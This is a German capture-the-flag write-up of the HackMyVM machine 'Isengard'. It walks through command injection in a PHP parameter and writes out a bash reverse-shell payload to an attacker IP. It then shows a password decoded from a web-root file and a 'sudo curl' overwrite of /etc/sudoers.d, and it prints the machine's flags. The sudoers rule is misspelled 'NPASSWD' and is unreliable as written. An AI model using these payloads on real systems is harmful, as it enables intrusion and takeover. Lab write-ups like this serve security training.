# Isengard (HackMyVM) - Penetration Test Bericht

![Isengard.png](Isengard.png)

**Datum des Berichts:** 22. November 2022  
**VM:** Isengard  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Isengard](https://hackmyvm.eu/machines/machine.php?vm=Isengard)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Isengard_HackMyVM_Easy/](https://alientec1908.github.io/Isengard_HackMyVM_Easy/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (Command Injection)](#phase-2-web-enumeration--initial-access-command-injection)
5.  [Phase 3: Privilege Escalation (www-data -> sauron -> root)](#phase-3-privilege-escalation-www-data---sauron---root)
    *   [www-data zu sauron (Passwort aus Datei)](#www-data-zu-sauron-passwort-aus-datei)
    *   [sauron zu root (Sudo/Curl File Write)](#sauron-zu-root-sudocurl-file-write)
6.  [Proof of Concept (Finale Root-Eskalation via Sudo Curl)](#proof-of-concept-finale-root-eskalation-via-sudo-curl)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Isengard" von HackMyVM (Schwierigkeitsgrad: Easy). Die initiale Erkundung offenbarte lediglich einen offenen HTTP-Port (80), auf dem ein Apache-Webserver lief. Durch gezieltes Fuzzing (mittels `ffuf`) auf einen thematisch benannten Pfad (`/y0ush4lln0tp4ss/east/mellon.php`) wurde der GET-Parameter `frodo` identifiziert. Dieser Parameter war anfällig für OS Command Injection, was den initialen Zugriff als Benutzer `www-data` durch Ausführung einer Reverse Shell ermöglichte.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **www-data zu sauron:** Im Verzeichnis `/var/www/html/y0ush4lln0tp4ss/east/` wurde eine Datei `ring.txt` gefunden. Der Inhalt dieser Datei, nach zweifacher Base64-Dekodierung, offenbarte das Passwort `yXKMw5wpSArL2CLX`. Dieses Passwort gehörte dem Benutzer `sauron`, zu dem mittels `su` gewechselt werden konnte.
2.  **sauron zu root:** Der Benutzer `sauron` hatte `sudo`-Rechte, um `curl` als `root` auszuführen. Dies wurde genutzt, um eine neue `sudoers`-Regel (`sauron ALL=(ALL) NPASSWD: ALL`) aus einer temporären Datei (`/tmp/sauron`) in `/etc/sudoers.d/sauron` zu schreiben. Anschließend konnte mit `sudo -i` eine Root-Shell ohne Passwort erlangt werden.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `ffuf`
*   `curl`
*   `nc (netcat)`
*   `base64`
*   `su`
*   `python3` (`pty.spawn`)
*   `export` (Shell-Variable)
*   `cd`, `ls`, `cat`, `echo`
*   `sudo`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.132` (VirtualBox VM).
    *   Der Hostname `isengard.vm` wurde der lokalen `/etc/hosts`-Datei hinzugefügt.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -sV -A 192.168.2.132 -p-`) offenbarte:
        *   **Port 80 (HTTP):** Apache httpd 2.4.51 (Debian), Seitentitel "Gray wizard". Kein anderer Port war offen.

---

## Phase 2: Web Enumeration & Initial Access (Command Injection)

1.  **Web-Enumeration:**
    *   `gobuster dir` fand nur `index.html`.
    *   Durch (im Log nicht gezeigte) Entdeckung des Pfades `/y0ush4lln0tp4ss/east/mellon.php` und anschließendes Parameter-Fuzzing mit `ffuf` wurde der GET-Parameter `frodo` identifiziert:
        ```bash
        ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u 'http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?FUZZ=id' -fs 0
        # Gefunden: frodo
        ```

2.  **Identifizierung und Ausnutzung der Command Injection:**
    *   Der `frodo`-Parameter war anfällig für OS Command Injection:
        ```bash
        curl 'http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?frodo=id' 
        # Ausgabe: uid=33(www-data) gid=33(www-data) groups=33(www-data)
        ```
    *   Die Schwachstelle wurde genutzt, um eine Reverse Shell zu starten:
        ```bash
        # Auf Angreifer-Maschine:
        # nc -lvnp 9001
        # Über Browser/Curl (URL-kodiert):
        # http://isengard.vm/y0ush4lln0tp4ss/east/mellon.php?frodo=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[Angreifer-IP]%2F9001%200%3E%261%27
        ```
    *   Initialer Zugriff als `www-data` wurde erlangt und die Shell stabilisiert.

---

## Phase 3: Privilege Escalation (www-data -> sauron -> root)

### www-data zu sauron (Passwort aus Datei)

1.  **Passwortfund:**
    *   Als `www-data` wurde im Verzeichnis `/var/www/html/y0ush4lln0tp4ss/east/` die Datei `ring.txt` gefunden.
    *   Der Inhalt wurde zweifach Base64-dekodiert:
        ```bash
        base64 -d ring.txt | base64 -d
        # Ausgabe: yXKMw5wpSArL2CLX
        ```
2.  **Benutzerwechsel zu `sauron`:**
    *   Das dekodierte Passwort `yXKMw5wpSArL2CLX` gehörte dem Benutzer `sauron`.
    *   `www-data@isengard:/...$ su sauron` mit diesem Passwort war erfolgreich.
    *   Die User-Flag `HMV{Y0uc4nN0tp4sS}` wurde in `/home/sauron/user.txt` gefunden.

### sauron zu root (Sudo/Curl File Write)

1.  **Sudo-Rechte-Prüfung für `sauron`:**
    *   `sudo -l` (als `sauron`) offenbarte, dass `sauron` den Befehl `curl` als `root` ausführen durfte (obwohl die genaue `sudoers`-Regel im Log fehlt, wird dies durch den erfolgreichen `sudo curl`-Befehl impliziert).

2.  **Manipulation der `sudoers`-Konfiguration:**
    *   Eine neue `sudoers`-Regel wurde erstellt, die `sauron` passwortlosen Root-Zugriff gewährt:
        ```bash
        echo 'sauron ALL=(ALL) NPASSWD: ALL' > /tmp/sauron
        ```
    *   Diese Regel wurde mittels `sudo curl` in das `sudoers.d`-Verzeichnis geschrieben:
        ```bash
        sudo curl file:///tmp/sauron -o /etc/sudoers.d/sauron
        # Passwort für sauron (yXKMw5wpSArL2CLX) wurde hier benötigt
        ```
3.  **Erlangung der Root-Shell:**
    *   `sauron@isengard:~$ sudo -i` funktionierte nun ohne Passwort und gewährte eine Root-Shell.

---

## Proof of Concept (Finale Root-Eskalation via Sudo Curl)

**Kurzbeschreibung:** Die finale Privilegieneskalation nutzte `sudo`-Rechte des Benutzers `sauron` aus, um `curl` als `root` auszuführen. Dies ermöglichte das Schreiben einer neuen, erweiterten `sudoers`-Regel in das Verzeichnis `/etc/sudoers.d/`. Diese neue Regel gewährte `sauron` passwortlosen `sudo`-Zugriff für alle Befehle, wodurch eine Root-Shell erlangt werden konnte.

**Schritte (als `sauron`):**
1.  Erstelle eine Datei mit der gewünschten `sudoers`-Regel:
    ```bash
    echo 'sauron ALL=(ALL) NPASSWD: ALL' > /tmp/sauron
    ```
2.  Verwende `sudo curl`, um diese Regel in `/etc/sudoers.d/` zu schreiben (Passwort für `sauron` wird benötigt):
    ```bash
    sudo curl file:///tmp/sauron -o /etc/sudoers.d/sauron
    ```
3.  Erlange eine Root-Shell:
    ```bash
    sudo -i
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/sauron/user.txt`):**
    ```
    HMV{Y0uc4nN0tp4sS}
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    HMV{Y0uD3stR0y3dTh3r1nG}
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webanwendungssicherheit (Command Injection):**
    *   **DRINGEND:** Beheben Sie die OS Command Injection Schwachstelle in `/y0ush4lln0tp4ss/east/mellon.php`. Alle Benutzereingaben (insbesondere GET/POST-Parameter wie `frodo`) müssen strikt validiert und saniert werden, bevor sie in Systembefehlen verwendet werden.
*   **Passwortsicherheit und -management:**
    *   **Speichern Sie niemals Passwörter in Dateien im Web-Root oder anderen leicht zugänglichen Orten**, selbst wenn sie (unzureichend durch Base64) kodiert sind.
    *   Erzwingen Sie starke, einzigartige Passwörter für alle Systembenutzer.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Überprüfen und härten Sie alle `sudo`-Regeln.
        *   Entfernen Sie die Berechtigung für `sauron` (oder andere unprivilegierte Benutzer), `curl` oder ähnliche Tools, die zum Schreiben von Dateien verwendet werden können, als `root` auszuführen.
        *   Gewähren Sie `sudo`-Rechte nur nach dem Prinzip der geringsten Rechte. Vermeiden Sie `NOPASSWD: ALL`-Regeln.
*   **Dateisystemberechtigungen:**
    *   Stellen Sie sicher, dass kritische Konfigurationsdateien und -verzeichnisse (wie `/etc/sudoers` und `/etc/sudoers.d/`) nur für den `root`-Benutzer schreibbar sind.
*   **Netzwerksicherheit:**
    *   Beschränken Sie die Angriffsfläche, indem nur absolut notwendige Dienste exponiert werden (hier war nur Port 80 offen, was gut ist, aber der Dienst selbst war verwundbar).
*   **Allgemeine Systemhärtung:**
    *   Führen Sie regelmäßige Sicherheitsaudits und Schwachstellenscans durch.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
